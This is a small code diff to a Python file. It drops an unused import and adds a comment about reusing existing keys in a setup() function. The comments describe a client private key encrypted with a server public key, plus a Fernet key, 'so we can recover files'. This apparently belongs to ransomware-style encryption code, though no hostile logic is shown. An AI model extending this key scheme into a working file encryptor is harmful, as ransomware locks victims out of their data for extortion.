@@ -1,4 +1,3 @@
-from msilib.schema import Error
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 from cryptography.fernet import Fernet
@@ -19,6 +18,7 @@ global public_key #client_public_key
 
 
 # setup encryptor, save public key, encrypted private key(using server public key)
+# if keys already exist dont crete new because then we cant recover files - use existing ones.
 def setup():
     global encrypted_private_key
     global encrypted_fernet_key
